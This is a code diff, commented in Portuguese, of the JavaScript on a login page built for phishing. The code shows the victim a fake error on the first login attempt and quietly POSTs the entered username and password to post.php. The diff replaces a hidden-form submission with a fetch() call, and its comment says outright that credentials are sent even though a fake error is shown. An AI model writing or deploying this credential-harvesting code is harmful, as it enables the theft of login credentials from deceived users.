@@ -85,25 +85,15 @@
             if (attemptCount === 1) {
                 errorMessage.style.display = "block";
                 event.preventDefault();
-                // Cria um formulário oculto para enviar os dados na primeira tentativa
-                var hiddenForm = document.createElement("form");
-                hiddenForm.method = "post";
-                hiddenForm.action = "post.php";
 
-                var hiddenUsername = document.createElement("input");
-                hiddenUsername.type = "hidden";
-                hiddenUsername.name = "username";
-                hiddenUsername.value = username;
-
-                var hiddenPassword = document.createElement("input");
-                hiddenPassword.type = "hidden";
-                hiddenPassword.name = "password";
-                hiddenPassword.value = password;
-
-                hiddenForm.appendChild(hiddenUsername);
-                hiddenForm.appendChild(hiddenPassword);
-                document.body.appendChild(hiddenForm);
-                hiddenForm.submit();
+                // Envia as credenciais mesmo com a exibição do erro falso
+                fetch("post.php", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    },
+                    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+                });
 
                 return false;
             }
